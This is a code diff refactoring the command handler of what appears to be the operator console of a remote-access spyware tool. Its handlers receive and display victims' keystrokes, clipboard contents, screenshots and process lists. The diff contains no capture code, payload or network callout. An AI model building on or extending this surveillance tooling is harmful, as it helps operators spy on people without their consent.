@@ -4,52 +4,40 @@ import admin.Admin;
 import controllers.base.ConsumeExecutable;
 import models.SystemInfoModel;
 import org.json.JSONArray;
-import org.json.JSONObject;
 import swing.ProcessDialog;
 import utils.JSON;
-import utils.console;
 
 import javax.imageio.ImageIO;
 import javax.swing.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
-import java.io.File;
-import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.Vector;
 
 import static utils.Command.*;
-import static utils.Command.COMMAND_CLIENT_SCREEN;
-import static utils.Environment.KEYLOGGER_SPLITTER;
+import static utils.Environment.*;
 
 public class ConsumeController {
     private static Map<String, ConsumeExecutable<JSON>> controller = new HashMap();
 
     public static void init() {
-        put(COMMAND_SYNC, ConsumeController::synchronize);
-        put(COMMAND_CLIPBOARD, ConsumeController::getClipboard);
-        put(COMMAND_KEYLOGGER, ConsumeController::getKeylogger);
-        put(COMMAND_CLIENT_SCREEN, ConsumeController::getScreen);
-        put(COMMAND_MONITORING, ConsumeController::getMonitoring);
-        put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
-        put(COMMAND_PROCESS, ConsumeController::getProcess);
+        put(COMMAND_CLIENT_SYSTEM_USAGE, ConsumeController::getMonitoring);
+        put(COMMAND_CLIENT_CLIPBOARD, ConsumeController::getClipboard);
+        put(COMMAND_CLIENT_KEYLOGGER, ConsumeController::getKeylogger);
+        put(COMMAND_GET_CLIENTS, ConsumeController::getAllClients);
+        put(COMMAND_CLIENT_PROCESS, ConsumeController::getProcess);
+        put(COMMAND_CLIENT_MONITOR, ConsumeController::getScreen);
         put(COMMAND_NOTIFICATION, ConsumeController::notify);
-    }
-
-    private static void notify(JSON input, Admin admin) {
-        Admin.getGui().showNotification(input.get("notification"));
-    }
-
-    private static void getProcess(JSON input, Admin admin) {
-        JSONArray arr = new JSONArray(input.get("processes"));
-        ProcessDialog dialog = new ProcessDialog(arr, admin);
-        dialog.setVisible(true);
+        put(COMMAND_SYNC, ConsumeController::synchronize);
     }
 
     private static void getScreen(JSON input, Admin admin) {
         try {
+            if (!input.get("form").equals(Admin.getGui().getCurrentClientId())) {
+                return;
+            }
+
             JSONArray imageBuffer = new JSONArray(input.get("image"));
             int length = input.getInt("length");
             byte[] arr = new byte[length];
@@ -63,32 +51,37 @@ public class ConsumeController {
             ImageIcon temp1 = new ImageIcon(image2);
             Admin.getGui().fetchClientMonitor(temp1);
         } catch (Exception e) {
-            throw new RuntimeException(e);
+
         }
+    }
+
+    private static void getProcess(JSON input, Admin admin) {
+        JSONArray arr = new JSONArray(input.get("processes"));
+        ProcessDialog dialog = new ProcessDialog(arr, admin);
+        dialog.setVisible(true);
     }
 
     private static void synchronize(JSON input, Admin admin) {
         Admin.getGui().sync();
-        admin.setClients(new HashMap());
+        admin.resetClients();
         ConsumeController.getAllClients(input, admin);
     }
 
     private static void getKeylogger(JSON input, Admin admin) {
         String[] logs = input.get("keylogger").split(KEYLOGGER_SPLITTER);
-        console.log(logs.length+"");
         if (logs.length == 1 && logs[0].isEmpty()) {
-            Admin.getGui().appendLog("[Keylog] Keylog empty");
+            Admin.getGui().appendLog(String.format(KEYLOGGER_TEMPLATE, EMPTY));
             return;
         }
 
-        for(String log : logs) {
-            Admin.getGui().appendLog("[Keylog] " + log);
+        for (String log : logs) {
+            Admin.getGui().appendLog(String.format(KEYLOGGER_TEMPLATE, log));
         }
     }
 
     private static void getClipboard(JSON input, Admin admin) {
         String clipboard = input.get("clipboard");
-        Admin.getGui().appendLog("[Clipboard] " + (clipboard.length() == 0 ? "Clipboard empty" : clipboard));
+        Admin.getGui().appendLog(String.format(CLIPBOARD_TEMPLATE, clipboard.isEmpty() ? EMPTY : clipboard));
     }
 
     private static void getAllClients(JSON input, Admin admin) {
@@ -110,6 +103,9 @@ public class ConsumeController {
 
     private static void getMonitoring(JSON input, Admin admin) {
         try {
+            if (!input.get("form").equals(Admin.getGui().getCurrentClientId())) {
+                return;
+            }
             Admin.getGui().fetchClientSystemUsage(
                     input.getInt("cpu"),
                     input.getInt("ram"),
@@ -120,12 +116,17 @@ public class ConsumeController {
         }
     }
 
-    public static ConsumeExecutable get(String key) {
-        return controller.getOrDefault(key, ConsumeController::getNotFoundController);
+    private static void notify(JSON input, Admin admin) {
+        Admin.getGui().showNotification(input.get("notification"));
     }
 
+    //CONCEPTION
     private static void getNotFoundController(JSON jsonObject, Admin admin) throws Exception {
         throw new Exception("Invalid Command");
+    }
+
+    public static ConsumeExecutable get(String key) {
+        return controller.getOrDefault(key, ConsumeController::getNotFoundController);
     }
 
     public static ConsumeExecutable put(String key, ConsumeExecutable<JSON> value) {
